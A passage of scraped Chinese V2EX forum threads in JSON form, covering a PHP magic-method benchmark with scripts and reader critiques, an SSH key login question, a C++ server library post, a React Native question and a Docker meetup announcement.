/或系统设置了代理服务器的情况，严格来说都不完整", "你访问的地址不存在", "现在改成 Google.cn 结论就差不多了", "TCP REST", "看标题，以为会详细讲一下 GFW ...", "浏览器发送 dns 查询\r", "系统查询缓存\r", "木有\r", "系统看看我的 dns 是多少\r", "系统通过默认路由发出\r", "路由收到 跟据路由表转发\r", ".\r", ".\r", ".\r", ".\r", ".\r", "路由收到 跟据路由表转发\r", "dns 收到请求\r", "dns 查询缓存\r", "秒 get 到一个神奇的地址\r", "dns 返回结果\r", "路由收到 跟据路由表转发\r", ".\r", ".\r", ".\r", ".\r", ".\r", "路由收到 跟据路由表转发\r", "客户端收到 告诉浏览器\r", "浏览器尝试访问一个神奇的地址\r", "…\r", "…\r", "…\r", "…\r", "…\r", "…\r", "连接超时", "题主既然说了\"不遗漏任何细节\"...\r", "就应该至少说说（最重要的） google 数据中心内部发生了什么\r", "另外，如果提一下 CDN 也会很好啊", "\r", "......", "没人提 hosts 文件,还有底层的 TCP 窗口,路由,数据链路层拆分成帧,校验,还有物理层的调制解调.\r", "总得分为三部分:一,电脑的变化.二,传播路径的变化.三,谷歌服务器的变化.文中貌似只提了第一部分", "404", "没提到 AS15169 里面的故事呢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://p1.bpimg.com/567571/5eac11a49b0f939a.jpg\"></p>\n</div></div>"], "reply": "2", "tittle": "请教一下 RN ScrollView 左右滑动事件如何拿到 key？", "comment": ["你是指 index 么?   拿 offset 自己算吧", " 恩，我后来 e.nativeEvent.contentOffset.x 算了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>GitHub 地址: <a href=\"https://github.com/looyao/mevent\" rel=\"nofollow\">https://github.com/looyao/mevent</a></p>\n<p>感兴趣可以试下，比较适合做聊天室，推送相关，或者简单的 RESTful API 接口。</p>\n</div></div>"], "reply": "8", "tittle": "发一个最近用 C++撸的服务端库，支持 HTTP/WebSocket", "comment": ["支持！ v2 上 C++的讨论太少啦。", "感觉现在玩 C++的人越来越少了....我还在坚持后端 C/C++ 顶多加入 lua 脚本支持", " 我现在工作中大部分 php 都搞定了，只有很少的场景需要用到 C++...", "不错，学习", "不错，我目前工作基本上是 C++，国内某代码托管平台。", "如果量不大的话 推荐一个很 NB 的库 叫 crow ", "围观大神", "大神    66666"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>前言</h1>\n<p>曾经记得鸟哥 Laruence 提过不建议使用\"魔术方法\"，自此之后一旦涉及使用魔术方法的地方，我都会下意识的想一下，这样写真的好吗？由于这一到两年来一直忙于工作和学习新的知识，所以在这道坎儿上一直没有做深入的探索一直恍恍惚惚过去了，今年是我进行深入学习的一年，因此现在必须对这个问题做个了结了。我们先来看看鸟哥 Laruence 博客曾经提到的：</p>\n<blockquote>\n<p>当我把 PPT 分享给公司的同事的时候, 会有人质疑, 魔术方法都不让用?\n优化的建议, 是建议, 是防止大家滥用, 肆无忌惮的用. 如果你能在写代码的时候, 能意识到, 什么慢, 什么快, 从而避免一些没有必要的对魔术方法的调用, 那就是这个优化建议所追求的效果了</p>\n</blockquote>\n<h1>疑惑</h1>\n<ol>\n<li>魔术方法真的性能比较差吗？</li>\n<li>PHP7 里使用魔术方法的性能还是存在问题吗？</li>\n<li>我们应该如何合理的使用魔术方法？</li>\n</ol>\n<h1>方案</h1>\n<p>面对我的疑惑，我的方案是:</p>\n<ul>\n<li>统计对比使用魔术方法和不使用魔术方法脚本执行的时间差异</li>\n<li>PHP5.6.26-1 下连续执行脚本 n 次</li>\n<li>统计执行时间的平均值 /最小值 /最大值</li>\n<li>PHP7.0.12-2 下连续执行脚本 n 次</li>\n<li>统计执行时间的平均值 /最小值 /最大值</li>\n</ul>\n<p>目前个人能力有限，只能通过这种方式，如果你有更好的方案或者建议可以告诉我，谢谢， haha~</p>\n<h1>测试</h1>\n<h3>__construct</h3>\n<p>首先我们先来看看构造函数__construct 的实验， php 脚本如下：</p>\n<pre><code>&lt;?php\n/**\n * 魔术方法性能探索\n *\n * 构造函数\n *\n * @author TIGERB &lt;https://github.com/TIGERB&gt;\n */\n\nrequire('./function.php');\nif (!isset($argv[1])) {\n    die('error: variable is_use_magic is empty');\n}\n$is_use_magic = $argv[1];\n\n/**\n * 构造函数使用类名\n */\nclass ClassOne\n{\n    public function classOne()\n    {\n        # code...\n    }\n}\n\n/**\n * 构造函数使用魔术函数__construct\n */\nclass ClassTwo\n{\n    public function __construct()\n    {\n        # code...\n    }\n}\n\n$a = getmicrotime();\nif ($is_use_magic === 'no_magic') {\n    new ClassOne();\n}else {\n    new ClassTwo();\n}\n$b = getmicrotime();\n\necho  ($b-$a) . \"\\n\";\n\n</code></pre>\n<ul>\n<li>PHP5.6 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 no_magic php5 construct\n\n// 运行数据统计脚本\nsh analysis ./logs/__construct_no_magic_php5.log 10000\n\n// 结果\navg: 34μm\nmax: 483μm\nmin: 26μm\n</code></pre>\n<ul>\n<li>PHP5.6 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 magic php5 construct\n\n// 运行数据统计脚本\nsh analysis ./logs/__construct_magic_php5.log 10000\n\n// 结果\navg: 28μm\nmax: 896μm\nmin: 20μm\n</code></pre>\n<ul>\n<li>PHP7.0 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 no_magic php construct\n\n// 运行数据统计脚本\nsh analysis ./logs/__construct_no_magic_php.log 10000\n\n// 结果\navg: 19μm\nmax: 819μm\nmin: 13μm\n</code></pre>\n<ul>\n<li>PHP7.0 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 magic php construct\n\n// 运行数据统计脚本\nsh analysis ./logs/__construct_magic_php.log 10000\n\n// 结果\navg: 14μm\nmax: 157μm\nmin: 10μm\n</code></pre>\n<p>通过上面的数据我们可以看出：</p>\n<blockquote>\n<p>使用__construct 作为构造函数的脚本执行的平均时间是要快于使用类名作为构造函数的，__大概快 5 到 6 微秒__，不论是在 php5.6 还是 php7.0 中。</p>\n</blockquote>\n<h3>__call</h3>\n<p>接着，我们来看看__call 的实验， php 脚本如下：</p>\n<pre><code>&lt;?php\n/**\n * 魔术方法性能探索\n *\n * 构造函数\n *\n * @author TIGERB &lt;https://github.com/TIGERB&gt;\n */\n\nrequire('./function.php');\nif (!isset($argv[1])) {\n    die('error: variable is_use_magic is empty');\n}\n$is_use_magic = $argv[1];\n\n/**\n * 构造函数使用类名\n */\nclass ClassOne\n{\n    public function __construct()\n    {\n        # code...\n    }\n\n    public function test()\n    {\n        # code...\n    }\n}\n\n/**\n * 构造函数使用魔术函数__construct\n */\nclass ClassTwo\n{\n    public function __construct()\n    {\n        # code...\n    }\n\n    public function __call($method, $argus)\n    {\n        # code...\n    }\n}\n\n$a = getmicrotime();\nif ($is_use_magic === 'no_magic') {\n    $instance = new ClassOne();\n    $instance-&gt;test();\n}else {\n    $instance = new ClassTwo();\n    $instance-&gt;test();\n}\n$b = getmicrotime();\n\necho  ($b-$a) . \"\\n\";\n\n</code></pre>\n<ul>\n<li>PHP5.6 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 no_magic php5 call\n\n// 运行数据统计脚本\nsh analysis ./logs/__call_no_magic_php5.log 10000\n\n// 结果\navg: 27μm\nmax: 206μm\nmin: 20μm\n</code></pre>\n<ul>\n<li>PHP5.6 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 magic php5 call\n\n// 运行数据统计脚本\nsh analysis ./logs/__call_magic_php5.log 10000\n\n// 结果\navg: 29μm\nmax: 392μm\nmin: 22μm\n</code></pre>\n<ul>\n<li>PHP7.0 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 no_magic php call\n\n// 运行数据统计脚本\nsh analysis ./logs/__call_no_magic_php.log 10000\n\n// 结果\navg: 16μm\nmax: 256μm\nmin: 10μm\n</code></pre>\n<ul>\n<li>PHP7.0 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 magic php call\n\n// 运行数据统计脚本\nsh analysis ./logs/__call_magic_php.log 10000\n\n// 结果\navg: 18μm\nmax: 2459μm\nmin: 11μm\n</code></pre>\n<p>通过上面的数据我们可以看出：</p>\n<blockquote>\n<p>使用__call 的脚本执行的平均时间是要慢于不使用，__大概慢 2 微秒__，不论是在 php5.6 还是 php7.0 中。</p>\n</blockquote>\n<h3>__callStatic</h3>\n<p>接着，我们来看看__callStatic 的实验， php 脚本如下：</p>\n<pre><code>&lt;?php\n/**\n * 魔术方法性能探索\n *\n * 静态重载函数\n *\n * @author TIGERB &lt;https://github.com/TIGERB&gt;\n */\n\nrequire('./function.php');\nif (!isset($argv[1])) {\n    die('error: variable is_use_magic is empty');\n}\n$is_use_magic = $argv[1];\n\n/**\n * 存在 test 静态方法\n */\nclass ClassOne\n{\n    public function __construct()\n    {\n        # code...\n    }\n\n    public static function test()\n    {\n        # code...\n    }\n}\n\n/**\n * 使用重载实现 test\n */\nclass ClassTwo\n{\n    public function __construct()\n    {\n        # code...\n    }\n\n    public static function __callStatic($method, $argus)\n    {\n        # code...\n    }\n}\n\n$a = getmicrotime();\nif ($is_use_magic === 'no_magic') {\n    ClassOne::test();\n}else {\n    ClassTwo::test();\n}\n$b = getmicrotime();\n\necho  ($b-$a) . \"\\n\";\n</code></pre>\n<ul>\n<li>PHP5.6 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 no_magic php5 callStatic\n\n// 运行数据统计脚本\nsh analysis ./logs/__callStatic_no_magic_php5.log 10000\n\n// 结果\navg: 25μm\nmax: 129μm\nmin: 19μm\n</code></pre>\n<ul>\n<li>PHP5.6 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 magic php5 callStatic\n\n// 运行数据统计脚本\nsh analysis ./logs/__callStatic_magic_php5.log 10000\n\n// 结果\navg: 28μm\nmax: 580μm\nmin: 20μm\n</code></pre>\n<ul>\n<li>PHP7.0 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 no_magic php callStatic\n\n// 运行数据统计脚本\nsh analysis ./logs/__callStatic_no_magic_php.log 10000\n\n// 结果\navg: 14μm\nmax: 130μm\nmin: 9μm\n</code></pre>\n<ul>\n<li>PHP7.0 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 magic php callStatic\n\n// 运行数据统计脚本\nsh analysis ./logs/__callStatic_magic_php.log 10000\n\n// 结果\navg: 14μm\nmax: 159μm\nmin: 10μm\n</code></pre>\n<p>通过上面的数据我们可以看出：</p>\n<blockquote>\n<p>在 php5.6 中使用__callStatic 的脚本执行的平均时间是要慢于不使用，__大概慢 3 微秒__;在 php7.0 中使用__callStatic 的脚本执行的平均时间是要大致等于不使用__callStatic 的；</p>\n</blockquote>\n<h3>__set</h3>\n<p>接着，我们来看看__set 的实验， php 脚本如下：</p>\n<pre><code>&lt;?php\n/**\n * 魔术方法性能探索\n *\n * 设置私有属性__set\n *\n * @author TIGERB &lt;https://github.com/TIGERB&gt;\n */\n\nrequire('./function.php');\nif (!isset($argv[1])) {\n    die('error: variable is_use_magic is empty');\n}\n$is_use_magic = $argv[1];\n\n/**\n * 实现公共方法设置私有属性\n */\nclass ClassOne\n{\n    /**\n     * 私有属性\n     *\n     * @var string\n     */\n    private $someVariable = 'private';\n\n    public function __construct()\n    {\n        # code...\n    }\n\n    public function setSomeVariable($value = '')\n    {\n        $this-&gt;someVariable = $value;\n    }\n}\n\n/**\n * 使用_set 设置私有属性\n */\nclass ClassTwo\n{\n    /**\n     * 私有属性\n     *\n     * @var string\n     */\n    private $someVariable = 'private';\n\n    public function __construct()\n    {\n        # code...\n    }\n\n    public function __set($name = '', $value = '')\n    {\n        $this-&gt;$name = $value;\n    }\n}\n\n$a = getmicrotime();\nif ($is_use_magic === 'no_magic') {\n    $instance = new ClassOne();\n    $instance-&gt;setSomeVariable('public');\n}else {\n    $instance = new ClassTwo();\n    $instance-&gt;someVariable = 'public';\n}\n$b = getmicrotime();\n\necho  ($b-$a) . \"\\n\";\n</code></pre>\n<ul>\n<li>PHP5.6 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 no_magic php5 set\n// 运行数据统计脚本\nsh analysis ./logs/__set_no_magic_php5.log 10000\n\n// 结果\navg: 31μm\nmax: 110μm\nmin: 24μm\n</code></pre>\n<ul>\n<li>PHP5.6 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 magic php5 set\n// 运行数据统计脚本\nsh analysis ./logs/__set_magic_php5.log 10000\n\n// 结果\navg: 33μm\nmax: 138μm\nmin: 25μm\n</code></pre>\n<ul>\n<li>PHP7.0 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 no_magic php set\n// 运行数据统计脚本\nsh analysis ./logs/__set_no_magic_php.log 10000\n\n// 结果\navg: 15μm\nmax: 441μm\nmin: 11μm\n</code></pre>\n<ul>\n<li>PHP7.0 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 magic php set\n// 运行数据统计脚本\nsh analysis ./logs/__set_magic_php.log 10000\n\n// 结果\navg: 17μm\nmax: 120μm\nmin: 11μm\n</code></pre>\n<p>通过上面的数据我们可以看出：</p>\n<blockquote>\n<p>使用__set 的脚本执行的平均时间是要慢于不使用，__大概慢 2 微秒__，不论是在 php5.6 还是 php7.0 中。</p>\n</blockquote>\n<h3>__get</h3>\n<p>接着，我们来看看__get 的实验， php 脚本如下：</p>\n<pre><code>&lt;?php\n/**\n * 魔术方法性能探索\n *\n * 读取私有属性__get\n *\n * @author TIGERB &lt;https://github.com/TIGERB&gt;\n */\n\nrequire('./function.php');\nif (!isset($argv[1])) {\n    die('error: variable is_use_magic is empty');\n}\n$is_use_magic = $argv[1];\n\n/**\n * 实现公共方法获取私有属性\n */\nclass ClassOne\n{\n    /**\n     * 私有属性\n     *\n     * @var string\n     */\n    private $someVariable = 'private';\n\n    public function __construct()\n    {\n        # code...\n    }\n\n    public function getSomeVariable()\n    {\n        return $this-&gt;someVariable;\n    }\n}\n\n/**\n * 使用_get 获取私有属性\n */\nclass ClassTwo\n{\n    /**\n     * 私有属性\n     *\n     * @var string\n     */\n    private $someVariable = 'private';\n\n    public function __construct()\n    {\n        # code...\n    }\n\n    public function __get($name = '')\n    {\n        return $this-&gt;$name;\n    }\n}\n\n$a = getmicrotime();\nif ($is_use_magic === 'no_magic') {\n    $instance = new ClassOne();\n    $instance-&gt;getSomeVariable();\n}else {\n    $instance = new ClassTwo();\n    $instance-&gt;someVariable;\n}\n$b = getmicrotime();\n\necho  ($b-$a) . \"\\n\";\n</code></pre>\n<ul>\n<li>PHP5.6 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 no_magic php5 get\n// 运行数据统计脚本\nsh analysis ./logs/__get_no_magic_php5.log 10000\n\n// 结果\navg: 28μm\nmax: 590μm\nmin: 20μm\n</code></pre>\n<ul>\n<li>PHP5.6 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP5.6 中连续调用脚本 10000 次\nsh test 10000 magic php5 get\n// 运行数据统计脚本\nsh analysis ./logs/__get_magic_php5.log 10000\n\n// 结果\navg: 28μm\nmax: 211μm\nmin: 22μm\n</code></pre>\n<ul>\n<li>PHP7.0 不使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 no_magic php get\n// 运行数据统计脚本\nsh analysis ./logs/__get_no_magic_php.log 10000\n\n// 结果\navg: 16μm\nmax: 295μm\nmin: 10μm\n</code></pre>\n<ul>\n<li>PHP7.0 使用魔术方法数据如下，单位微秒μm</li>\n</ul>\n<pre><code>// PHP7.0 中连续调用脚本 10000 次\nsh test 10000 magic php get\n// 运行数据统计脚本\nsh analysis ./logs/__get_magic_php.log 10000\n\n// 结果\navg: 19μm\nmax: 525μm\nmin: 12μm\n</code></pre>\n<p>通过上面的数据我们可以看出：</p>\n<blockquote>\n<p>在 php5.6 中使用__get 的脚本执行的平均时间是要大致等于不使用__get 的;在 php7.0 中使用__get 的脚本执行的平均时间是要慢于不使用，__大概慢 3 微秒__。</p>\n</blockquote>\n<h1>结语</h1>\n<p>这里主要测试了__construct()， __call()， __callStatic()， __get()， __set()这五个常用的且可有其他实现方式代替的魔法函数。通过上面的测试再回来解答我的疑惑</p>\n<blockquote>\n<ol>\n<li>魔术方法真的性能比较差吗？</li>\n</ol>\n</blockquote>\n<p>答：除了使用__construct 之外，这里使用其他的魔法方法的时间大致慢 10 微妙以内。</p>\n<blockquote>\n<ol>\n<li>PHP7 里使用魔术方法的性能还是存在问题吗？</li>\n</ol>\n</blockquote>\n<p>答：在 PHP7 中使用与不使用魔术方法之间的差异和在 PHP5.6 中近乎一致。</p>\n<blockquote>\n<ol>\n<li>我们应该如何合理的使用魔术方法？</li>\n</ol>\n</blockquote>\n<p>答：通过整个测试我们可以看出使不使用魔法方法这之间的执行时间差异大致都是在 10 微妙以内的，所以如果魔法方法可以很好的节省我们的开发成本和优化我们的代码结构，我们应该可以考虑牺牲掉这不到 10 微妙。而__construct 是要快的，所以使用__construct 应该没什么异议。</p>\n<h1>脚本源码</h1>\n<blockquote>\n<p><a href=\"https://github.com/TIGERB/easy-tips/tree/master/php/magic-function\" rel=\"nofollow\">https://github.com/TIGERB/easy-tips/tree/master/php/magic-function</a></p>\n</blockquote>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><h1>纠正</h1>\n<p>单位错误：纠正μm 为 μs</p>\n<p>文字错误：微妙为微秒</p>\n<p>函数使用不当：microtime()支持float 传参 true</p>\n</div></div>"], "reply": "27", "tittle": "PHP 魔法函数性能分析", "comment": ["支持分享。", " THX ～ 也希望大家帮我督错～", "很不错的尝试，不过你测试方法有点问题，我们知道 php-cli 启动后会做很多准备工作，实际上测试逻辑占了很少时间。你可以在 php 内部 loop 很多次", " thx~", "厉害了我滴哥", "脚本欠严谨 ... 不过还是赞这个测试的态度 ...\r", "\r", "顺便指个问题 ... 微秒是 μs 不是 μm ... 另外 microtime 支持传入一个参数你可以看看 ...", "microtime(true)， php 内部循环就好\r", "\r", "p.s.实际上想当然也是魔术方法慢，用魔术方法肯定会多几个判断的", "赞一个，有图表就更溜了 ~~", "厉害了~", "666", " \r", " thx~ 学习了，哈哈～", " 文豪威武～😄", "支持楼主。不过除了执行速度问题外，不推荐用魔术方法主要是 由于 魔术方法容易改变 类中属性，或者说 埋下一些 很难调试的坑。\r", "不过呢，也不是说不能用。合理使用就没问题了。", " thx~", " 不错的提议，后续加上， thx~", " thx~ \r", "\r", "我的一些愚见，哈哈：如果完全符合面向对象的编程，类内部的属性是不应该直接暴露出去的，要符合闭原则，但是往往我们的实际编程中是有这个需求的，我们通常的做法可以：\r", "1. 设置属性为 public => 不符合面向对象设计原则\r", "2. 实现一个修改私有属性的 public 方法 => 不够统一\r", "\r", "但是__get,__set 其实就是实现统一可控", "技术好文要顶！但是有个疑问，为什么 max 和 min 相差这么多？是不是你开启了 opcache 的缘故，测试前做个预热比较好。", " thx~ 是没进行预热，学习了\r", "\r", "我估计，可能是加载 PHP 解析器出现抖动了吧～", "Laravel 里有不少对__call()的应用。", " 所以 laravel 是个很优雅的框架，哈哈～", "瞎扯淡。。。\r", "快 5 到 6 微秒。。。咋不说快 5 到 6 纳秒，皮秒呢", " 只是因为鸟哥曾对使用魔法方法的建议，我自己想看看这之间真正的差异而已，结果快了慢了多少都不是目的，了结了我曾经心头的疑虑才是目的。", "   几微秒的差距，有误差和预热的存在，你的测试结果没有意义。还有某鸟这句话是 10 年前说的吧，你现在来测这个问题也没有意义。\r", "当然，你就是只是了结曾经心头的疑虑。", " 是啊～", "这个文章发的到处都是了， 3L 提的那个你怎么还没改，我根据你的代码测出来效果刚好相反， magic 方法比一般方法慢一倍：\r", "\r", "```\r", "<?php\r", "/**\r", " * 魔术方法性能探索\r", " *\r", " * 构造函数\r", " *\r", " * @", " TIGERB <", ";\r", " */\r", "\r", "if (!isset($argv[1])) {\r", "    die('error: variable is_use_magic is empty');\r", "}\r", "$is_use_magic = $argv[1];\r", "\r", "/**\r", " * 构造函数使用类名\r", " */\r", "class ClassOne\r", "{\r", "    public function __construct()\r", "    {\r", "     \t# code...\r", "    }\r", "\r", "    public function test()\r", "    {\r", "$i=0;\r", "$i++;\r", "$arr=[];\r", "$arr['test']=1;\r", "        # code...\r", "    }\r", "}\r", "\r", "/**\r", " * 构造函数使用魔术函数__construct\r", " */\r", "class ClassTwo\r", "{\r", "    public function __construct()\r", "    {\r", "     \t# code...\r", "    }\r", "\r", "    public function __call($method, $argus)\r", "    {\r", "$i=0;\r", "$i++;\r", "$arr=[];\r", "$arr['test']=1;\r", "\r", "        # code...\r", "    }\r", "}\r", "\r", "$a = microtime(true);\r", "if ($is_use_magic === 'no_magic') {\r", "echo \"no_magic\\n\";\r", "    $instance = new ClassOne();\r", "for($i=0;$i<10000000;$i++)\r", "    $instance->test();\r", "}else {\r", "echo \"magic\\n\";\r", "    $instance = new ClassTwo();\r", "for($i=0;$i<10000000;$i++)\r", "    $instance->test();\r", "}\r", "$b = microtime(true);\r", "\r", "echo  ($b-$a) . \"\\n\";\r", "\r", "\r", "```\r", "\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php56 test.php no_magic\r", "no_magic\r", "3.8641951084137\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php56 test.php magic\r", "magic\r", "7.3454520702362\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php70 test.php no_magic\r", "no_magic\r", "1.3668580055237\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php70 test.php magic\r", "magic\r", "2.172700881958", "构造函数方法测出来和你的结论是一致的：\r", "```\r", "<?php \r", "/** \r", "* 魔术方法性能探索 \r", "* \r", "* 构造函数 \r", "* \r", "* @", " TIGERB <", ">; \r", "*/ \r", "\r", "if (!isset($argv[1])) { \r", "die('error: variable is_use_magic is empty'); \r", "} \r", "$is_use_magic = $argv[1]; \r", "\r", "/**\r", " * 构造函数使用类名\r", " */\r", "class ClassOne\r", "{\r", "    public function classOne()\r", "    {\r", "        # code...\r", "    }\r", "}\r", "\r", "/**\r", " * 构造函数使用魔术函数__construct\r", " */\r", "class ClassTwo\r", "{\r", "    public function __construct()\r", "    {\r", "        # code...\r", "    }\r", "}\r", "\r", "$a = microtime(true); \r", "if ($is_use_magic === 'no_magic') { \r", "echo \"no_magic\\n\"; \r", "\r", "for($i=0;$i<10000000;$i++) \r", "$instance = new ClassOne(); \r", "}else { \r", "echo \"magic\\n\"; \r", "\r", "for($i=0;$i<10000000;$i++) \r", "$instance = new ClassTwo(); \r", "} \r", "$b = microtime(true); \r", "\r", "echo ($b-$a) . \"\\n\"; \r", "\r", "\r", "```\r", "\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php56 test2.php no_magic\r", "no_magic\r", "2.2117800712585\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php56 test2.php magic\r", "magic\r", "2.1968791484833\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php70 test2.php no_magic\r", "no_magic\r", "1.2584509849548\r", "[root@iZ239ui2iq8Z luminati-proxy-solution]# php70 test2.php magic\r", "magic\r", "1.2768771648407", " 我求的是使用不使用之间的时间差值，并且跑了 10000 次，加载 php-cli 时间抖动的应该是影响不大了吧， php 内部 loop 我之前试过发现有些不对劲，我再试试。 thx~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题 。。。试了好几次都报错！</p>\n</div></div>"], "reply": "4", "tittle": "terminals 如何使用 key 登录", "comment": ["ssh 吗？提示什么错？", "用 ssh-copy-id 吧，无痛好用", "ssh -i /path/to/key username@ip 这样不行吗", "谢谢各位的热心回复，问题已解决。 key 的密码填错了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Docker 四周岁啦！今年的 Docker 4 周年生日会如约而至！从<strong>3 月 13 日至 3 月 19 日</strong>，全球各地的线上会议组织者将举办<strong>Docker Birthday #4 Meetup</strong> 活动，庆祝 Docker 四周岁，分享对 Docker 技术的热爱。</p>\n<p><img alt=\"\" src=\"https://p1.bqimg.com/4851/64860249025b1977.png\"></p>\n<p><strong>DaoCloud</strong> 作为 Docker Birthday 4 周年生日会中国地区的唯一承办方，将在<strong>北京、上海、深圳和成都</strong>举办 4 场四城联动 Docker Birthday 四周年 Meetup 。这是一场属于所有 Docker 爱好者的盛会，也是 Docker 社区在大中华地区举办的一场隆重的开年派对。</p>\n<p>本次 <strong>Docker Birthday #4 Meetup</strong> 将以“ docker native ” 为主题，我们邀请到了在 Docker 公司担任 Ecosystem Development Director 的 John Willis 大神，多位极具影响力的 Docker Maintainer 以及开源社区的核心开发者。他们将为大家奉献 Docker 原生技术的全球趋势、最具价值的核心原理，以及最干货的 Docker 实战分享。</p>\n<p><img alt=\"\" src=\"https://p1.bqimg.com/4851/813a7a52963ba5f9.jpg\"></p>\n<p>现场还有甜蜜生日蛋糕和惊喜好礼！快来报名加入这场全球派对，开启一场 Docker 原生之旅吧！</p>\n<h1>北京站</h1>\n<h2>活动时间和地点</h2>\n<p>时间： 3 月 14 日（周二） 7:00 － 10:00 pm</p>\n<p>地点：北京市海淀区中关村大街 11 号 E 世界财富中心 A 座 B2 · 联合创业办公社</p>\n<h2>话题和嘉宾介绍</h2>\n<ol>\n<li>\n<p>The Three Ways of DevOps ： John Willis （ Docker ）</p>\n</li>\n<li>\n<p>Rolling Update —还看 Docker 原生支持：孙宏亮（ DaoCloud, Swarm Maintainer ）</p>\n</li>\n<li>\n<p>容器基础技术介绍与实践：陈显鹭（阿里云）</p>\n</li>\n<li>\n<p>基于 Docker 生态圈打造面向初创公司的敏捷开发基础设施：丁立（逐鹿 X ）</p>\n</li>\n</ol>\n<h3><strong>北京站详情</strong>，<a href=\"http://cn.mikecrm.com/3X6lV1p\" rel=\"nofollow\">点此查看及报名</a></h3>\n<h1>上海站</h1>\n<h2>活动时间和地点</h2>\n<p>时间： 3 月 18 日（周六） 2:00 － 5:00  pm</p>\n<p>地点：上海市淞沪路 252 号创智天地二号楼二楼</p>\n<h2>话题和嘉宾介绍</h2>\n<ol>\n<li>\n<p>Running Docker Labs ：孙宏亮（ DaoCloud, Swarm Maintainer ）</p>\n</li>\n<li>\n<p>Docker 容器监控数据采集的探究与思考：王亚普（美团点评）</p>\n</li>\n<li>\n<p>许进（ Spring Cloud 中国社区创始人）话题待定</p>\n</li>\n<li>\n<p>百度技术专家，话题待定</p>\n</li>\n</ol>\n<h3><strong>上海站详情</strong>，<a href=\"http://cn.mikecrm.com/yKqJnIL\" rel=\"nofollow\">点此查看及报名</a></h3>\n<h1>成都站</h1>\n<h2>活动时间和地点</h2>\n<p>时间： 3 月 19 日（周日） 2:00 － 5:00  pm</p>\n<p>地点：成都市高新区天府五街 200 号菁蓉国际广场 4 号楼 B 座 10 楼</p>\n<h2>话题和嘉宾介绍</h2>\n<ol>\n<li>\n<p>一个容器小白对 Docker 的定制：徐曾萍 Evelyn Xu (DaoCloud, Docker commiter ）</p>\n</li>\n<li>\n<p>Packer 与 Dockerfile ：朱礼（ DaoCloud 售前工程师）</p>\n</li>\n<li>\n<p>利用 Docker 实现 0 侵入服务的服务注册与发现：朱清（冰鉴科技高级研发经理 ）</p>\n</li>\n<li>\n<p>可信云容器解决方案评估方法：陈屹力（云计算开源产业联盟）</p>\n</li>\n</ol>\n<h3><strong>成都站详情</strong>，<a href=\"http://cn.mikecrm.com/Soaj2iF\" rel=\"nofollow\">点此查看及报名</a></h3>\n<h1>深圳站</h1>\n<h2>活动时间和地点</h2>\n<p>时间： 3 月 19 日（周日） 2:00 － 5:00  pm</p>\n<p>地点：深圳市南山区科发路 1 号富利臻大厦三层 思微 SimplyWork 2.0</p>\n<h2>话题和嘉宾介绍</h2>\n<ol>\n<li>\n<p>The Three Ways of DevOps ： John Willis （ Docker ）</p>\n</li>\n<li>\n<p>Running Docker Labs ：孙宏亮（ DaoCloud, Swarm Maintainer ）</p>\n</li>\n<li>\n<p>Docker 集群自动化部署运维实践经验分享：叶德华（深信服）</p>\n</li>\n<li>\n<p>基于平安云构建容器服务：朱玉华（平安科技）</p>\n</li>\n</ol>\n<h3><strong>深圳站详情</strong>，<a href=\"http://cn.mikecrm.com/3JZvB8p\" rel=\"nofollow\">点此查看及报名</a></h3>\n<p><strong>主办方</strong>\n<img alt=\"\" src=\"http://i1.piimg.com/4851/e46c80d780274126.png\"></p>\n<p><strong>指导单位</strong>\n<img alt=\"\" 